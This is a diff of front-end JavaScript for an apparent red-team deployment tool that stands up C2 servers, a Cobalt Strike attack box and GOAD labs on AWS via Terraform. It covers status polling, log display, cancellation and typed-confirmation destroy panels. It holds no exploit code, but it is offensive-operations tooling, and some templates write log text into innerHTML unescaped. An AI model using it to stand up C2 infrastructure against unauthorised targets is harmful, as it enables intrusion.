+
+                postDeploySteps.innerHTML = combinedHtml;
+                postDeploySteps.style.display = 'block';
+            } else if (isC2Only) {
+                // C2 deployment - direct to Deployment Manager for full checklist
+                postDeploySteps.innerHTML = `
+                    <div style="padding: 16px; background: var(--bg-section); border-radius: 6px; text-align: center;">
+                        <p style="margin: 0 0 10px 0; font-size: 0.95em; color: var(--text-secondary);">Deployment complete. Head to the <strong>Deployment Manager</strong> for the full post-deployment checklist, connection details, and infrastructure controls.</p>
+                        <button class="btn btn-primary" onclick="APP.navigateTo('deployments')" style="padding: 8px 24px;">Open Deployment Manager</button>
+                    </div>`;
                 postDeploySteps.style.display = 'block';
             } else {
                 // Unknown type - hide
@@ -2672,30 +8087,52 @@ function updateDeploymentUI(status) {
         
     } else if (status.status === 'error') {
         const errorLogs = status.logs ? status.logs.filter(log => log.type === 'error') : [];
-        
-        statusDiv.innerHTML = `
+        const allLogs = status.logs || [];
+
+        let errorHtml = `
             <div style="padding: 15px;">
-                <h3 style="color: var(--danger-text); margin: 0 0 15px 0;">❌ Deployment Failed</h3>
+                <h3 style="color: var(--danger-text); margin: 0 0 15px 0;">Deployment Failed</h3>
                 <p style="color: var(--text-secondary); margin-bottom: 15px;">Elapsed time: ${status.elapsed_formatted}</p>
+        `;
+
+        // Phase checklist showing where it failed
+        errorHtml += renderPhaseChecklist(status);
+
+        errorHtml += `
                 ${errorLogs.length > 0 ? `
-                    <div style="background: var(--bg-terminal); color: var(--text-secondary); padding: 16px; border-radius: 8px; font-family: 'SF Mono', 'Monaco', 'Menlo', monospace; font-size: 0.9em; line-height: 1.6;">
+                    <div class="terminal-block" style="padding: 16px; border-radius: 8px; font-size: 0.9em; line-height: 1.6; margin-top: 12px; max-height: 250px; overflow-y: auto;">
                         ${errorLogs.map(log => {
                             const time = new Date(log.timestamp * 1000).toLocaleTimeString();
-                            return `<div style="margin-bottom: 8px;"><span style="color: var(--text-muted);">[${time}]</span> <span style="color: var(--danger-text);">${log.message}</span></div>`;
+                            return `<div style="margin-bottom: 8px;"><span style="color: #7A849E;">[${time}]</span> <span class="t-terminal">${log.message}</span></div>`;
                         }).join('')}
                     </div>
                 ` : `
-                    <div style="background: var(--bg-terminal); color: var(--danger-text); padding: 16px; border-radius: 8px; font-family: 'SF Mono', 'Monaco', 'Menlo', monospace; font-size: 0.9em;">
+                    <div class="terminal-block" style="padding: 16px; border-radius: 8px; font-size: 0.9em;">
                         ${status.error || 'Unknown error occurred'}
                     </div>
                 `}
+                ${allLogs.length > 0 ? `
+                    <details style="margin-top: 12px;">
+                        <summary style="cursor: pointer; color: var(--text-secondary); font-size: 0.9em; padding: 6px 0; user-select: none;">Full deployment logs (${allLogs.length} entries)</summary>
+                        <div class="terminal-block" style="padding: 16px; border-radius: 8px; font-size: 0.85em; line-height: 1.6; margin-top: 8px; max-height: 400px; overflow-y: auto;">
+                            ${allLogs.map(log => {
+                                const time = new Date(log.timestamp * 1000).toLocaleTimeString();
+                                const color = log.type === 'error' ? '#F08A84' :
+                                              log.type === 'success' ? '#7ECF8C' :
+                                              log.type === 'warning' ? '#E8C56D' : '#8BB4D9';
+                                return `<div style="margin-bottom: 4px;"><span style="color: #7A849E;">[${time}]</span> <span style="color: ${color};">${log.message}</span></div>`;
+                            }).join('')}
+                        </div>
+                    </details>
+                ` : ''}
                 <div style="margin-top: 15px;">
                     <button class="btn btn-secondary" onclick="resetPlanAndRetry()" style="margin-right: 10px;">
-                        🔄 Try Again
+                        Try Again
                     </button>
                 </div>
             </div>
         `;
+        statusDiv.innerHTML = errorHtml;
         statusDiv.className = 'status-display error';
     }
 }
@@ -2705,42 +8142,90 @@ function updateDeploymentUI(status) {
  */
 function updateDeployPageForType() {
     const deployTypeInfo = document.getElementById('deploy-type-info');
-    const deployTypeName = document.getElementById('deploy-type-name');
-    const deployTypeArch = document.getElementById('deploy-type-arch');
-    const deployTypeIcon = document.getElementById('deploy-type-icon');
+    const deployTypeTitle = document.getElementById('deploy-type-title');
+    const deployTypeComponents = document.getElementById('deploy-type-components');
+    const deployTypeDetails = document.getElementById('deploy-type-details');
     const domainPrereqSection = document.getElementById('domain-prereq-section');
     const warningDiv = document.getElementById('deployment-prereq-warning');
-    
+
     // Get the selected deployment type from config
     const deploymentTypeSelect = document.getElementById('deployment-type');
     const deploymentType = deploymentTypeSelect?.value || '';
     const config = DEPLOYMENT_CONFIGS[deploymentType];
-    
+
     if (config && deployTypeInfo) {
-        // Show deployment type info
+        // Show and style the overview
         deployTypeInfo.style.display = 'block';
         deployTypeInfo.style.background = config.color;
-        
-        if (deployTypeName) deployTypeName.textContent = config.title;
-        if (deployTypeArch) deployTypeArch.textContent = config.architectureNote || '';
-        
-        // Set icon based on type
-        if (deployTypeIcon) {
-            if (config.type === 'c2') deployTypeIcon.textContent = '🎯';
-            else if (config.type === 'goad') deployTypeIcon.textContent = '🏰';
-            else deployTypeIcon.textContent = '🔥';
+
+        if (deployTypeTitle) deployTypeTitle.textContent = config.title;
+
+        // Build components grid (same as config page)
+        if (deployTypeComponents) {
+            deployTypeComponents.innerHTML = config.components.map(comp => `
+                <div style="background: rgba(255,255,255,0.15); padding: 12px; border-radius: 6px; text-align: center;">
+                    <div style="font-size: 1.5em;">${comp.icon}</div>
+                    <div style="font-size: 1.3em; font-weight: bold; margin: 5px 0;">${comp.value}</div>
+                    <div style="font-size: 0.88em; opacity: 0.9;">${comp.label}</div>
+                </div>
+            `).join('');
         }
-        
+
+        // Build details section (same as config page)
+        if (deployTypeDetails) {
+            let detailsHtml = `
+                <div style="margin-bottom: 10px;">
+                    <strong>Best for:</strong> ${config.bestFor}
+                </div>
+                <div style="opacity: 0.9;">${config.details}</div>
+            `;
+
+            if (config.architectureNote) {
+                detailsHtml += `
+                    <div style="margin-top: 12px; padding: 8px 12px; background: rgba(255,255,255,0.2); border-radius: 6px; font-size: 0.88em;">
+                        ${config.architectureNote}
+                    </div>
+                `;
+            }
+
+            if (config.phases) {
+                detailsHtml += `
+                    <div style="margin-top: 12px; display: flex; gap: 10px; flex-wrap: wrap;">
+                        ${config.phases.map(phase => `
+                            <span style="background: rgba(255,255,255,0.2); padding: 5px 12px; border-radius: 15px; font-size: 0.88em;">
+                                ${phase}
+                            </span>
+                        `).join('')}
+                    </div>
+                `;
+            }
+
+            if (config.attacks) {
+                detailsHtml += `
+                    <div style="margin-top: 12px; font-size: 0.88em;">
+                        <strong>Available attacks:</strong> ${config.attacks.join(', ')}
+                    </div>
+                `;
+            }
+
+            // Estimated deployment time
+            const timeEstimate = DEPLOYMENT_TIMES[deploymentType];
+            if (timeEstimate) {
+                detailsHtml += `
+                    <div style="margin-top: 12px; font-size: 0.88em;">
+                        <strong>Estimated Deployment Time:</strong> ~${timeEstimate.min}-${timeEstimate.max} minutes
+                    </div>
+                `;
+            }
+
+            deployTypeDetails.innerHTML = detailsHtml;
+        }
+
         // Show/hide domain prereq based on whether it's required
         if (domainPrereqSection) {
-            if (config.requiresDomain) {
-                domainPrereqSection.style.display = 'block';
-            } else {
-                domainPrereqSection.style.display = 'none';
-                // For GOAD-only, domain is not required so hide any domain warnings
-            }
+            domainPrereqSection.style.display = config.requiresDomain ? 'block' : 'none';
         }
-        
+
         // Update warning message based on type
         if (warningDiv) {
             if (config.requiresDomain) {
@@ -2756,28 +8241,43 @@ function updateDeployPageForType() {
     }
 }
 
+let _pollCount = 0;
+const MAX_POLL_COUNT = 1200; // 1200 * 3s = 60 minutes max polling
+
 function pollDeploymentStatus(projectName = null) {
     const statusDiv = document.getElementById('deployment-status');
     const outputDiv = document.getElementById('deployment-output');
-    
+
     if (!statusDiv) return;
-    
+
     // Clear existing interval
     if (deploymentPollInterval) {
         clearInterval(deploymentPollInterval);
         deploymentPollInterval = null;
     }
-    
+
+    // Reset poll counter
+    _pollCount = 0;
+
     // Store project name for polling
     if (projectName) {
         window.currentDeploymentProject = projectName;
     }
-    
+
     // Immediately fetch status once before starting interval
     fetchAndUpdateDeploymentStatus();
-    
+
     // Then poll every 3 seconds
-    deploymentPollInterval = setInterval(fetchAndUpdateDeploymentStatus, 3000);
+    deploymentPollInterval = setInterval(() => {
+        _pollCount++;
+        if (_pollCount >= MAX_POLL_COUNT) {
+            clearInterval(deploymentPollInterval);
+            deploymentPollInterval = null;
+            showMessage('Status polling timed out after 60 minutes. Check deployment manually.', 'warning');
+            return;
+        }
+        fetchAndUpdateDeploymentStatus();
+    }, 3000);
 }
 
 /**
@@ -2830,6 +8330,17 @@ async function fetchAndUpdateDeploymentStatus() {
                     deploymentPollInterval = null;
             // Clear the project tracking
             window.currentDeploymentProject = null;
+            sessionStorage.removeItem('activeDeploymentProject');
+
+            // Auto-trigger setup check 3 minutes after successful deploy
+            if (status.status === 'success' && !window._setupCheckScheduled) {
+                window._setupCheckScheduled = true;
+                console.log('[SetupCheck] Scheduling automatic check in 3 minutes');
+                setTimeout(() => {
+                    window._setupCheckScheduled = false;
+                    runSetupCheck();
+                }, 180000);
+            }
                 }
         
         } catch (error) {
@@ -2883,7 +8394,7 @@ async function checkDomainConfig() {
                         <strong>C2 Subdomain:</strong> ${domain.c2_subdomain}.${domain.primary_domain}<br>
                         <strong>WWW Subdomain:</strong> ${domain.www_subdomain}.${domain.primary_domain}<br>
                         <strong>CDN Subdomain:</strong> ${domain.cdn_subdomain}.${domain.primary_domain}<br>
-                        <strong>Backup Domains:</strong> ${domain.backup_domains && domain.backup_domains.length > 0 ? domain.backup_domains.length : '0'} configured
+                        <strong>Backup Domains:</strong> ${domain.backup_domains && domain.backup_domains.filter(d => d !== domain.primary_domain).length > 0 ? domain.backup_domains.filter(d => d !== domain.primary_domain).length : '0'} configured
                     `;
                 }
             } else {
@@ -3075,19 +8586,37 @@ async function checkCSClientFile() {
         if (data.success) {
             if (data.has_file && data.latest_file) {
                 const file = data.latest_file;
-                
+                const isAutoDetected = !!data.auto_detected_dir;
+
                 // Hide upload form, show compact file info
                 if (uploadFormContainer) uploadFormContainer.style.display = 'none';
                 statusDiv.style.display = 'none';
-                
+
                 if (fileInfoDiv) {
                     fileInfoDiv.style.display = 'block';
+                    // Update the header label
+                    const headerSpan = fileInfoDiv.querySelector('span[style*="font-weight: bold"]');
+                    if (headerSpan) {
+                        headerSpan.textContent = isAutoDetected ? 'CS Client Auto-Detected' : 'Client Ready for Attack Box';
+                    }
                     if (fileDetails) {
-                        fileDetails.innerHTML = `
-                            <strong>Filename:</strong> ${file.filename}<br>
-                            <strong>Size:</strong> ${file.size_mb} MB<br>
-                            <strong>Path:</strong> ${file.path}
-                        `;
+                        const sizeMB = file.size_mb || (file.size / (1024 * 1024)).toFixed(1);
+                        if (isAutoDetected) {
+                            fileDetails.innerHTML = `
+                                <strong>Directory:</strong> uploads/${data.auto_detected_dir}/<br>
+                                <strong>Size:</strong> ${sizeMB} MB<br>
+                                <strong>Status:</strong> Will be auto-zipped and uploaded to S3 at deploy time<br>
+                                <span style="color: var(--text-muted); font-size: 0.9em;">
+                                    After deployment, RDP to the Attack Box and run <code>C:\\Tools\\CobaltStrike\\update.bat</code> with your license key.
+                                </span>
+                            `;
+                        } else {
+                            fileDetails.innerHTML = `
+                                <strong>Filename:</strong> ${file.filename || file.name}<br>
+                                <strong>Size:</strong> ${sizeMB} MB<br>
+                                <strong>Path:</strong> ${file.path || 'uploads_client/'}
+                            `;
+                        }
                     }
                 }
             } else {
@@ -3210,7 +8739,7 @@ async function handleCSClientDelete() {
 // =============================================================================
 
 async function checkSSHPublicKey() {
-    const statusDiv = document.getElementById('ssh-key-status');
+    const statusDiv = document.getElementById('ssh-key-setup-status');
     const keyInfoDiv = document.getElementById('ssh-key-info');
     const keyDetails = document.getElementById('ssh-key-details');
     const formContainer = document.getElementById('ssh-key-form-container');
@@ -3268,7 +8797,7 @@ async function checkSSHPublicKey() {
 async function saveSSHPublicKey() {
     const keyInput = document.getElementById('ssh-public-key-input');
     const saveBtn = document.getElementById('save-ssh-key-btn');
-    const statusDiv = document.getElementById('ssh-key-status');
+    const statusDiv = document.getElementById('ssh-key-setup-status');
     
     if (!keyInput) return;
     
@@ -3315,7 +8844,7 @@ async function saveSSHPublicKey() {
                         <p><strong>✅ SSH Key Saved Successfully!</strong></p>
                         <p><strong>Type:</strong> ${data.key_type}</p>
                         <p><strong>Fingerprint:</strong> <code>${data.fingerprint}</code></p>
-                        ${data.warning ? `<p style="color: var(--warning-text);"><strong>⚠️ Note:</strong> ${data.warning}</p>` : ''}
+                        ${data.warning ? `<p class="t-warning"><strong>⚠️ Note:</strong> ${data.warning}</p>` : ''}
                     </div>
                 `;
             }
@@ -3455,16 +8984,63 @@ async function updateDeploymentPrerequisites() {
     }
 }
 
+async function cancelDeployment() {
+    const projectName = window.currentDeploymentProject;
+    if (!projectName) {
+        showMessage('No active deployment to cancel', 'warning');
+        return;
+    }
+    if (!confirm('Are you sure you want to cancel the deployment? This will kill the Terraform process. You may need to run terraform destroy to clean up partial resources.')) {
+        return;
+    }
+    try {
+        const response = await fetch(`${API_BASE}/deploy/cancel`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ project_name: projectName })
+        });
+        const data = await response.json();
+        if (data.success) {
+            showMessage('Deployment cancelled', 'warning');
+        } else {
+            showMessage(data.error || 'Failed to cancel', 'error');
+        }
+    } catch (error) {
+        showMessage(`Cancel failed: ${error.message}`, 'error');
+    }
+}
+
 async function startDeployment() {
     // Get the selected deployment type to check requirements
     const deploymentTypeSelect = document.getElementById('deployment-type');
-    const deploymentType = deploymentTypeSelect?.value || '';
-    const config = DEPLOYMENT_CONFIGS[deploymentType];
-    
-    // Get project name from config
+    let deploymentType = deploymentTypeSelect?.value || '';
+
+    // Get project name from config form input
     const projectNameInput = document.getElementById('project-name');
-    const projectName = projectNameInput?.value || '';
-    
+    let projectName = projectNameInput?.value || '';
+
+    // If form fields are empty (user navigated directly to deploy page), load from saved config
+    if (!projectName || !deploymentType) {
+        try {
+            const resp = await fetch(`${API_BASE}/config`);
+            const cfgData = await resp.json();
+            if (cfgData.success && cfgData.config) {
+                if (!projectName) {
+                    projectName = cfgData.config.project_name || '';
+                    if (projectNameInput && projectName) projectNameInput.value = projectName;
+                }
+                if (!deploymentType) {
+                    deploymentType = cfgData.config.deployment_type || cfgData.config.engagement_type || '';
+                    if (deploymentTypeSelect && deploymentType) deploymentTypeSelect.value = deploymentType;
+                }
+            }
+        } catch (e) {
+            console.error('Failed to load saved config for deploy:', e);
+        }
+    }
+
+    const config = DEPLOYMENT_CONFIGS[deploymentType];
+
     if (!projectName) {
         alert('⚠️ Project name is required!\n\nPlease set a project name in the Configuration page.');
         return;
@@ -3506,11 +9082,22 @@ async function startDeployment() {
         }
     }
     
+    // Check AWS credentials are valid
+    try {
+        const awsCheck = await fetch(`${API_BASE}/health/aws-cli`);
+        const awsData = await awsCheck.json();
+        if (!awsData.success || !awsData.installed) {
+            missing.push('AWS CLI');
+        }
+    } catch (e) {
+        missing.push('AWS CLI');
+    }
+
     if (missing.length > 0) {
         alert(`⚠️ Prerequisites missing!\n\nPlease complete:\n- ${missing.join('\n- ')}`);
         return;
     }
-    
+
     // Customize confirmation message based on deployment type
     const deploymentName = config ? config.title : 'Infrastructure';
     if (!confirm(`Are you sure you want to deploy ${deploymentName}?\n\nProject: ${projectName}\n\nThis will create AWS resources and may incur costs.`)) {
@@ -3542,8 +9129,9 @@ async function startDeployment() {
     // Disable buttons during deployment
     disableDeployButton(true, 'Deployment starting...');
     
-    // Store current project name for polling
+    // Store current project name for polling (persist across page refresh)
     window.currentDeploymentProject = projectName;
+    sessionStorage.setItem('activeDeploymentProject', projectName);
     
     try {
         const response = await fetch(`${API_BASE}/deploy/deploy`, { 
@@ -3560,7 +9148,7 @@ async function startDeployment() {
             statusDiv.innerHTML = `
                 <div style="padding: 15px;">
                     <h3 style="color: var(--danger-text); margin: 0 0 10px 0;">❌ Deployment Failed to Start</h3>
-                    <p style="color: var(--text-secondary);">${data.error || 'Unknown error'}</p>
+                    <p class="t-secondary">${data.error || 'Unknown error'}</p>
                 </div>
             `;
             statusDiv.className = 'status-display error';
@@ -3570,7 +9158,7 @@ async function startDeployment() {
         statusDiv.innerHTML = `
             <div style="padding: 15px;">
                 <h3 style="color: var(--danger-text); margin: 0 0 10px 0;">❌ Connection Error</h3>
-                <p style="color: var(--text-secondary);">${error.message}</p>
+                <p class="t-secondary">${error.message}</p>
             </div>
         `;
         statusDiv.className = 'status-display error';
@@ -3731,10 +9319,10 @@ async function runPlan() {
                 outputDiv.innerHTML = `
                     <div style="margin-top: 15px; background: var(--bg-terminal); border-radius: 8px; overflow: hidden;">
                         <div style="padding: 10px 15px; background: rgba(0,0,0,0.3); display: flex; justify-content: space-between; align-items: center;">
-                            <span style="color: var(--text-muted); font-size: 0.88em;">📋 Terraform Plan Output</span>
-                            <button onclick="copyPlanOutput(this)" style="padding: 4px 10px; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.15); border-radius: 4px; color: var(--text-secondary); font-size: 0.75em; cursor: pointer;">Copy</button>
+                            <span style="color: #7A849E; font-size: 0.88em;">📋 Terraform Plan Output</span>
+                            <button onclick="copyPlanOutput(this)" style="padding: 4px 10px; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.15); border-radius: 4px; color: #B0B8CC; font-size: 0.75em; cursor: pointer;">Copy</button>
                         </div>
-                        <pre style="margin: 0; padding: 15px; font-family: 'SF Mono', 'Monaco', 'Menlo', monospace; font-size: 0.88em; line-height: 1.6; color: var(--success-text); white-space: pre-wrap; word-break: break-word;">${escapeHtml(output)}</pre>
+                        <pre style="margin: 0; padding: 15px; font-family: 'SF Mono', 'Monaco', 'Menlo', monospace; font-size: 0.88em; line-height: 1.6; color: #7ECF8C; white-space: pre-wrap; word-break: break-word;">${escapeHtml(output)}</pre>
                     </div>
                 `;
             }
@@ -3784,7 +9372,7 @@ async function runPlan() {
                             </button>
                         </div>
                         <div style="margin-top: 10px; padding: 10px; background: var(--warning-bg); border-radius: 6px; font-size: 0.9em;">
-                            <strong>Quick Fix:</strong> Run <code style="background: var(--bg-terminal); padding: 2px 6px; border-radius: 3px;">aws configure</code> in your terminal
+                            <strong>Quick Fix:</strong> Run <code class="code-inline">aws configure</code> in your terminal
                         </div>
                     `;
                     break;
@@ -3832,10 +9420,10 @@ async function runPlan() {
                 outputDiv.innerHTML = `
                     <div style="margin-top: 15px; background: var(--bg-terminal); border-radius: 8px; overflow: hidden;">
                         <div style="padding: 10px 15px; background: rgba(0,0,0,0.3); display: flex; justify-content: space-between; align-items: center;">
-                            <span style="color: var(--text-muted); font-size: 0.88em;">📋 Error Output</span>
-                            <button onclick="copyErrorOutput(this)" style="padding: 4px 10px; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.15); border-radius: 4px; color: var(--text-secondary); font-size: 0.75em; cursor: pointer;">Copy</button>
+                            <span style="color: #7A849E; font-size: 0.88em;">📋 Error Output</span>
+                            <button onclick="copyErrorOutput(this)" style="padding: 4px 10px; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.15); border-radius: 4px; color: #B0B8CC; font-size: 0.75em; cursor: pointer;">Copy</button>
                         </div>
-                        <pre style="margin: 0; padding: 15px; font-family: 'SF Mono', 'Monaco', 'Menlo', monospace; font-size: 0.88em; line-height: 1.6; color: var(--danger-text); white-space: pre-wrap; word-break: break-word;">${escapeHtml(data.stderr || data.error)}</pre>
+                        <pre style="margin: 0; padding: 15px; font-family: 'SF Mono', 'Monaco', 'Menlo', monospace; font-size: 0.88em; line-height: 1.6; color: var(--text-terminal); white-space: pre-wrap; word-break: break-word;">${escapeHtml(data.stderr || data.error)}</pre>
                     </div>
                 `;
             }
@@ -3947,137 +9535,115 @@ async function destroyInfrastructure(projectName = null) {
  * This is used when deployment fails but leaves resources behind
  * @param {string} projectName - Optional project name to purge (for multi-project support)
  */
-async function purgeFailedDeployment(projectName = null) {
-    // Try to get project name from various sources if not provided
+/**
+ * Show inline destroy/purge confirmation panel within the deployment card
+ */
+async function showDestroyConfirmation(projectName, mode = 'destroy') {
     if (!projectName) {
-        projectName = window.currentDeploymentProject;
-        if (!projectName) {
-            const projectNameInput = document.getElementById('project-name');
-            projectName = projectNameInput?.value || null;
-        }
-    }
-
-    if (!projectName) {
-        showMessage('No project name found — cannot purge', 'error');
+        showMessage('No project name found', 'error');
         return;
     }
 
-    // Fetch resources for this project from cache to show in review
-    const cached = loadResourceCache();
-    const projectResources = cached
-        ? (cached.resources || []).filter(r => r.project === projectName)
-        : [];
-
-    // Show review modal
-    showPurgeReviewModal(projectName, projectResources);
-}
-
-/**
- * Show a review modal before purge/destroy, listing resources and commands
- */
-function showPurgeReviewModal(projectName, resources, mode = 'purge') {
-    // Remove existing modal if any
-    const existing = document.getElementById('purge-review-modal');
-    if (existing) existing.remove();
-
-    const isPurge = mode === 'purge';
-    const title = isPurge ? 'Purge Review' : 'Destroy Review';
-    const confirmWord = isPurge ? 'PURGE' : 'DESTROY';
-    const btnColor = isPurge ? 'var(--warning)' : 'var(--danger)';
-
-    // Build resource list HTML
-    const typeIcons = {
-        'ec2': '🖥️', 'vpc': '🌐', 'subnet': '📡', 'sg': '🔒', 'eip': '🔗',
-        'nat': '🚪', 's3': '📦', 'igw': '🌍', 'rtb': '🛣️', 'eni': '🔌',
-        'keypair': '🔑', 'pcx': '🔀', 'iam-role': '👤', 'iam-profile': '🎭',
-        'route53-zone': '🌐', 'acm-cert': '🔐'
-    };
-
-    let resourcesHtml = '';
-    if (resources.length > 0) {
-        const rows = resources.map(r => {
-            const icon = typeIcons[r.type] || '📄';
-            return `<tr style="border-bottom: 1px solid var(--border);">
-                <td style="padding: 6px 10px;">${icon} <span style="text-transform: uppercase; font-size: 0.88em;">${r.type}</span></td>
-                <td style="padding: 6px 10px;">${r.name || '-'}</td>
-                <td style="padding: 6px 10px;"><code style="background: var(--bg-terminal); padding: 2px 6px; border-radius: 3px; font-size: 0.88em;">${r.id || '-'}</code></td>
-            </tr>`;
-        }).join('');
-        resourcesHtml = `
-            <div style="margin-top: 15px;">
-                <p style="color: var(--text-secondary); margin-bottom: 8px;"><strong>${resources.length} resource${resources.length !== 1 ? 's' : ''}</strong> tagged with this project:</p>
-                <div style="max-height: 200px; overflow-y: auto; border: 1px solid var(--border); border-radius: var(--radius);">
-                    <table style="width: 100%; border-collapse: collapse; font-size: 0.9em;">
-                        <thead><tr style="background: var(--bg-section);">
-                            <th style="padding: 6px 10px; text-align: left;">Type</th>
-                            <th style="padding: 6px 10px; text-align: left;">Name</th>
-                            <th style="padding: 6px 10px; text-align: left;">ID</th>
-                        </tr></thead>
-                        <tbody>${rows}</tbody>
-                    </table>
-                </div>
-            </div>`;
-    } else {
-        resourcesHtml = `
-            <div style="margin-top: 15px; padding: 12px; background: var(--warning-bg); border-left: 3px solid var(--warning); border-radius: var(--radius-sm);">
-                <p style="margin: 0; color: var(--warning-text);">No tagged resources found for this project. Terraform state may still contain resources to clean up.</p>
-            </div>`;
+    const container = document.getElementById(`destroy-confirm-${projectName}`);
+    if (!container) {
+        showMessage('Confirmation container not found — expand the deployment first', 'error');
+        return;
     }
 
-    // Build commands preview — matches actual backend execution
-    // Backend uses project_name directly as workspace name and workspace-specific tfvars
-    const tfvarsFile = `../configs/${projectName}.tfvars`;
-    const commandsHtml = `
-        <div style="margin-top: 15px;">
-            <p style="color: var(--text-secondary); margin-bottom: 8px;"><strong>Commands that will run:</strong></p>
-            <div style="background: var(--bg-terminal); padding: 12px 15px; border-radius: var(--radius); font-family: 'SF Mono', Monaco, monospace; font-size: 0.88em; line-height: 1.8; color: var(--text-terminal);">
-                <div><span style="color: var(--text-muted);"># 1. Select Terraform workspace</span></div>
-                <div>$ terraform workspace select ${projectName}</div>
-                <div style="margin-top: 8px;"><span style="color: var(--text-muted);"># 2. Refresh state to sync with AWS (eu-central-1)</span></div>
-                <div>$ terraform refresh -var-file=${tfvarsFile}</div>
-                <div style="margin-top: 8px;"><span style="color: var(--text-muted);"># 3. Destroy all managed resources (eu-central-1 only)</span></div>
-                <div>$ terraform destroy -auto-approve -var-file=${tfvarsFile}</div>
-                ${isPurge ? `<div style="margin-top: 8px;"><span style="color: var(--text-muted);"># 4. Fallback if step 3 fails (force destroy without refresh)</span></div>
-                <div>$ terraform destroy -auto-approve -refresh=false -var-file=${tfvarsFile}</div>` : ''}
+    // If a confirmation panel (not a result panel) is already visible, toggle it closed.
+    // Result panels have "Destroy Complete" or "Destroy Failed" — don't toggle those,
+    // instead replace them with the new confirmation.
+    const isResultPanel = container.innerHTML.includes('Destroy Complete') || container.innerHTML.includes('Destroy Failed');
+    if (container.style.display !== 'none' && container.innerHTML && !isResultPanel) {
+        hideDestroyConfirmation(projectName);
+        return;
+    }
+
+    const isPurge = mode === 'purge';
+    const confirmWord = isPurge ? 'PURGE' : 'DESTROY';
+    const title = isPurge ? 'Purge Review' : 'Destroy Review';
+    const btnColor = isPurge ? 'var(--warning)' : 'var(--danger)';
+
+    // Show loading state immediately while we fetch live resources
+    const resourcesLoadingHtml = `
+        <div id="destroy-resources-${projectName}" style="margin-top: 12px;">
+            <div style="display: flex; align-items: center; gap: 10px; padding: 12px; background: var(--bg-section); border-radius: var(--radius); color: var(--text-secondary); font-size: 0.88em;">
+                <div class="spinner" style="width: 16px; height: 16px; border-width: 2px;"></div>
+                Querying AWS for live resource list...
             </div>
-            <p style="margin-top: 8px; font-size: 0.88em; color: var(--text-muted);">Region: <strong>eu-central-1</strong> &middot; State: terraform.tfstate.d/${projectName}/ &middot; Config: configs/${projectName}.tfvars</p>
         </div>`;
 
-    const modal = document.createElement('div');
-    modal.id = 'purge-review-modal';
-    modal.style.cssText = 'position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.8); z-index: 10000; display: flex; align-items: center; justify-content: center; padding: 20px;';
+    // Build commands preview
+    const tfvarsFile = `../configs/${projectName}.tfvars`;
+    const commandsHtml = `
+        <div style="margin-top: 12px;">
+            <p style="color: var(--text-secondary); margin-bottom: 8px; font-size: 0.9em;"><strong>Commands that will run:</strong></p>
+            <div class="terminal-block" style="font-size: 0.82em; line-height: 1.8;">
+                <div><span class="t-muted"># 1. Select Terraform workspace</span></div>
+                <div>$ terraform workspace select ${projectName}</div>
+                <div style="margin-top: 6px;"><span class="t-muted"># 2. Refresh state to sync with AWS</span></div>
+                <div>$ terraform refresh -var-file=${tfvarsFile}</div>
+                <div style="margin-top: 6px;"><span class="t-muted"># 3. Destroy all managed resources</span></div>
+                <div>$ terraform destroy -auto-approve -var-file=${tfvarsFile}</div>
+                ${isPurge ? `<div style="margin-top: 6px;"><span class="t-muted"># 4. Fallback if step 3 fails</span></div>
+                <div>$ terraform destroy -auto-approve -refresh=false -var-file=${tfvarsFile}</div>` : ''}
+            </div>
+            <p style="margin-top: 6px; font-size: 0.8em; color: var(--text-muted);">Workspace: <strong>${projectName}</strong> · Config: configs/${projectName}.tfvars</p>
+        </div>`;
 
-    modal.innerHTML = `
-        <div style="background: var(--bg-card); border: 1px solid var(--border); border-radius: 12px; max-width: 700px; width: 100%; max-height: 85vh; overflow: hidden; display: flex; flex-direction: column;">
-            <div style="padding: 20px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center;">
-                <h2 style="margin: 0; color: var(--gold);">${title} — ${projectName}</h2>
-                <button onclick="closePurgeReviewModal()" style="background: none; border: none; color: var(--text-primary); font-size: 24px; cursor: pointer;">&times;</button>
+    // Unique IDs for this instance
+    const inputId = `destroy-confirm-input-${projectName}`;
+    const btnId = `destroy-confirm-btn-${projectName}`;
+
+    container.innerHTML = `
+        <div style="margin-top: 15px; border: 2px solid var(--danger); border-radius: 8px; overflow: hidden; max-height: 0px; opacity: 0; transition: max-height 0.4s ease, opacity 0.3s ease;">
+            <div style="padding: 14px 18px; background: var(--danger-bg); display: flex; justify-content: space-between; align-items: center;">
+                <span style="font-weight: 700; color: var(--danger-text); font-size: 0.95em;">${title} — ${projectName}</span>
+                <button onclick="hideDestroyConfirmation('${projectName}')" style="background: none; border: none; color: var(--text-secondary); font-size: 18px; cursor: pointer; padding: 0 4px; line-height: 1;">&times;</button>
             </div>
-            <div style="flex: 1; overflow-y: auto; padding: 20px;">
-                <div style="padding: 12px; background: var(--danger-bg); border-left: 3px solid var(--danger); border-radius: var(--radius-sm); margin-bottom: 15px;">
-                    <p style="margin: 0; color: var(--danger-text); font-weight: 600;">This action cannot be undone. All resources managed by this project's Terraform state will be permanently deleted.</p>
+            <div style="padding: 16px 18px; background: var(--bg-card);">
+                <div style="padding: 10px 12px; background: var(--danger-bg); border-left: 3px solid var(--danger); border-radius: var(--radius-sm); margin-bottom: 4px;">
+                    <p style="margin: 0; color: var(--danger-text); font-weight: 600; font-size: 0.88em;">This action cannot be undone. All resources managed by this project's Terraform state will be permanently deleted.</p>
                 </div>
-                ${resourcesHtml}
+                ${resourcesLoadingHtml}
                 ${commandsHtml}
-                <div style="margin-top: 20px;">
-                    <label style="display: block; color: var(--text-secondary); margin-bottom: 6px;">Type <strong>${confirmWord}</strong> to confirm:</label>
-                    <input type="text" id="purge-confirm-input" placeholder="${confirmWord}" style="width: 100%; padding: 10px; background: var(--bg-input); border: 1px solid var(--border); border-radius: var(--radius); color: var(--text-primary); font-size: 1em; box-sizing: border-box;">
+                <div style="margin-top: 14px; display: flex; align-items: center; gap: 12px;">
+                    <div style="flex: 1;">
+                        <label style="display: block; color: var(--text-secondary); margin-bottom: 4px; font-size: 0.85em;">Type <strong>${confirmWord}</strong> to confirm:</label>
